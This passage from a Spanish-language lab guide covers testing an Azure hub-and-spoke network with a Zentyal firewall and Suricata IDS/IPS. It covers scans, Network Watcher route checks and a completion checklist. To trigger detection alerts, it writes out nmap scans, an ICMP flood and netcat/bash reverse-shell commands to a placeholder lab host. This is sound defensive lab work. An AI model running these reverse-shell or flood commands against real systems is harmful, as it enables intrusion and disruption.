sudo nmap -sS -p 22,80,443,8080,3389 <IP_PRIVADA_VM_SPOKE2>

# Escaneo de versión de servicios (más ruidoso, más fácil de detectar)
sudo nmap -sV -p 22 <IP_PRIVADA_VM_SPOKE2>

# Escaneo agresivo (genera múltiples alertas en Suricata)
sudo nmap -A --top-ports 100 <IP_PRIVADA_VM_SPOKE2>
```

**Resultado esperado en Zentyal (`fast.log`):**

```
[**] [1:2009358:5] ET SCAN Nmap Scripting Engine User-Agent Detected [**]
[**] [1:2000537:8] ET SCAN Potential SSH Scan [**]
```

Desde la interfaz web: **IDS/IPS → Dashboard → Alerts** → filtrar por categoría `scan`.

---

### Prueba 3 – Salida a Internet y escaneo externo (verificar NAT)

```bash
# En VM-Spoke1 → verificar salida a Internet a través de Zentyal
nslookup www.microsoft.com
curl -I https://www.microsoft.com

# Escaneo controlado hacia un host público de prueba
sudo nmap -sV --top-ports 10 scanme.nmap.org
```

El tráfico hacia Internet es NATed por Zentyal usando la IP de Subnet-Back. Suricata inspeccionará el tráfico de egress si `eth0` (External) está configurada como interfaz monitorizada.

---

### Prueba 4 – Simulación de shell inversa con netcat (detección IPS)

Este escenario simula una técnica post-explotación básica: una shell inversa mediante netcat. Las reglas `emerging-shellcode` y `emerging-policy` de Suricata detectan estos patrones.

```bash
# PASO 1: En VM-Spoke2 → escuchar en un puerto (rol "atacante" / listener)
nc -lvp 4444

# PASO 2: En VM-Spoke1 → conectar y enviar shell (rol "víctima")
nc -e /bin/bash <IP_PRIVADA_VM_SPOKE2> 4444
```

Si `-e` no está disponible en la versión de netcat instalada (netcat-openbsd no incluye `-e`), usar la alternativa con bash:

```bash
# Alternativa en VM-Spoke1 (bash redirect)
bash -i >& /dev/tcp/<IP_PRIVADA_VM_SPOKE2>/4444 0>&1
```

**Resultado esperado en Zentyal:**

- **Modo IDS:** la conexión se establece pero Zentyal genera una alerta en `fast.log`.
- **Modo IPS:** la conexión es **bloqueada** antes de establecerse y se registra el evento.

```bash
# Filtrar alertas de shellcode/policy en fast.log
sudo grep -i 'shellcode\|netcat\|policy' /var/log/suricata/fast.log | tail -20
```

---

### Prueba 5 – Flood ICMP (detección de DoS)

```bash
# En VM-Spoke1 → generar flood ICMP hacia VM-Spoke2
sudo ping -f -c 1000 <IP_PRIVADA_VM_SPOKE2>
```

Las reglas `emerging-dos` de Suricata detectarán el flood ICMP y generarán alertas. En modo IPS, el tráfico excesivo será bloqueado automáticamente.

---

### Prueba 6 – Revisar y analizar todas las alertas generadas

```bash
# En FW-Zentyal

# Ver las últimas 50 alertas
sudo tail -50 /var/log/suricata/fast.log

# Filtrar por tipo de alerta: escaneos
sudo grep -i 'scan\|SCAN' /var/log/suricata/fast.log | tail -20

# Filtrar por tipo de alerta: shellcode / netcat
sudo grep -i 'shellcode\|netcat\|policy' /var/log/suricata/fast.log | tail -20

# Filtrar por tipo de alerta: DoS
sudo grep -i 'dos\|flood' /var/log/suricata/fast.log | tail -20

# Ver estadísticas de Suricata por interfaz
sudo suricatasc -c /var/run/suricata/suricata-command.socket iface-stat eth1

# Ver log de eventos completo (JSON)
sudo tail -f /var/log/suricata/eve.json | python3 -m json.tool
```

---

## Validación avanzada – Azure Network Watcher

### Rutas efectivas (Effective Routes)

```bash
# Obtener el ID de la NIC de VM-Spoke1
NIC1_ID=$(az vm show \
  -g RG-Networking -n VM-Spoke1 \
  --query "networkProfile.networkInterfaces[0].id" -o tsv)

# Ver rutas efectivas
az network nic show-effective-route-table \
  --ids $NIC1_ID \
  -o table
```

Verificar que exista:

- `0.0.0.0/0` → `nextHopType: VirtualAppliance` → nextHopIP = IP de NIC-Front Zentyal.
- `10.2.0.0/16` → `nextHopType: VirtualAppliance` (desde Spoke1).
- `10.1.0.0/16` → `nextHopType: VirtualAppliance` (desde Spoke2).

### Network Watcher – Next Hop

Muestra el tipo de salto, la IP y el route table ID para validar que las UDR están direccionando el tráfico correctamente.

```bash
az network watcher show-next-hop \
  --resource-group RG-Networking \
  --vm VM-Spoke1 \
  --nic 0 \
  --source-ip 10.1.0.4 \
  --dest-ip 13.107.21.200 \
  -o table
```

**Resultado esperado:**

```
NextHopType       NextHopIpAddress    RouteTableId
----------------  ------------------  ------------
VirtualAppliance  10.0.0.X            /subscriptions/.../RT-Spoke1
```

### Network Watcher – Connection Troubleshoot

En el portal de Azure: **Network Watcher → Connection Troubleshoot**.

| Campo | Valor |
|---|---|
| Source | VM-Spoke1 |
| Destination | IP privada de VM-Spoke2 (o `www.microsoft.com`) |
| Protocol | TCP |
| Destination port | 22 o 443 |

**Resultado esperado:** `Status = Reachable`. El diagnóstico mostrará el hop a través de FW-Zentyal y la ausencia de bloqueos por NSG.

### Validación de NSG (Effective NSG Rules)

```bash
az network nic list-effective-nsg \
  --resource-group RG-Networking \
  --name <NIC_NAME_VM_SPOKE1> \
  -o table
```

---

## Resultados esperados

| Prueba | Comando de referencia | Resultado esperado |
|---|---|---|
| Conectividad Spoke-to-Spoke | `ping -c 4 <IP_VM_SPOKE2>` | ICMP ok; TTL=62; tráfico visible en Zentyal |
| Salida a Internet | `curl -I https://www.microsoft.com` | HTTP 200; NATed por FW-Zentyal |
| Escaneo nmap detectado | `nmap -sS -p 22,80,443 <IP>` | Alerta `ET SCAN` en `/var/log/suricata/fast.log` |
| Shell inversa netcat detectada | `nc -e /bin/bash <IP> 4444` | Drop (IPS) o alerta (IDS) en log Suricata |
| Flood ICMP detectado | `ping -f -c 1000 <IP>` | Alerta `emerging-dos` en Suricata |
| Rutas efectivas correctas | `az network nic show-effective-route-table` | `nextHopType = VirtualAppliance` |
| Next hop correcto | `az network watcher show-next-hop` | `nextHopType = VirtualAppliance` |
| Conectividad confirmada | Network Watcher Connection Troubleshoot | `Status = Reachable` |

---

## Checklist de finalización

- [ ] VNet Hub (`10.0.0.0/16`) con `Subnet-Front` y `Subnet-Back` creadas.
- [ ] `Spoke1-VNet` (`10.1.0.0/16`) y `Spoke2-VNet` (`10.2.0.0/16`) con `WorkloadSubnet`.
- [ ] VM `FW-Zentyal` desplegada con dual-NIC e IP forwarding habilitado en Azure y SO.
- [ ] Zentyal instalado y accesible en `https://<IP>:8443`.
- [ ] Interfaces `eth0` (External) y `eth1` (Internal) configuradas correctamente en Zentyal.
- [ ] NAT / Masquerade activo en Zentyal (**Gateway → NAT Rules**).
- [ ] Reglas de firewall configuradas (Allow Spokes → Internet; Deny-All al final).
- [ ] IDS/IPS (Suricata) activo con rulesets `emerging-scan`, `emerging-exploit`, `emerging-shellcode`, `emerging-dos`.
- [ ] `nmap` y `netcat` instalados en `VM-Spoke1` y `VM-Spoke2`.
- [ ] VNet Peering Hub ↔ Spoke1 y Hub ↔ Spoke2 con forwarded traffic habilitado.
- [ ] UDRs aplicadas en Spoke1 y Spoke2 (next-hop = IP NIC-Front Zentyal `$FW_FRONT_IP`).
- [ ] `NSG-Subnet-Back`: SSH (22) + WebAdmin Zentyal (8443) inbound; All outbound.
- [ ] `NSG-Internal-Networks`: solo tráfico RFC 1918 (10/8, 172.16/12, 192.168/16).
- [ ] Pruebas nmap detectadas en `/var/log/suricata/fast.log`.
- [ ] Prueba netcat detectada o bloqueada por Zentyal IPS.
- [ ] Network Watcher confirma: `nextHopType = VirtualAppliance`.

---

## Referencias

- [Hub-spoke network topology in Azure – Microsoft Learn](https://learn.microsoft.com/en-us/azure/architecture/networking/architecture/hub-spoke)
- [Azure Network Watcher – Next hop](https://learn.microsoft.com/en-us/azure/network-watcher/diagnose-vm-network-routing-problem)
- [Azure Network Watcher – Effective routes](https://learn.microsoft.com/en-us/azure/network-watcher/network-watcher-ip-flow-verify-overview)
- [Zentyal 8.1 – Documentación oficial de instalación](https://doc.zentyal.org/es/installation.html)
- [Zentyal 8.1 – Script instalador oficial (GitHub)](https://github.com/zentyal/zentyal/blob/master/extra/ubuntu_installers/zentyal_installer_8.1.sh)
- [Zentyal 8.1 – Primeros pasos y asistente de configuración](https://doc.zentyal.org/es/firststeps.html)
- [Suricata IDS/IPS – documentación oficial](https://suricata.io/documentation/)
- [Emerging Threats Open Ruleset](https://rules.emergingthreats.net/)
- [nmap – referencia oficial](https://nmap.org/book/man.html)
- [CIS Ubuntu Linux 24.04 LTS Benchmark](https://www.cisecurity.org/benchmark/ubuntu_linux)
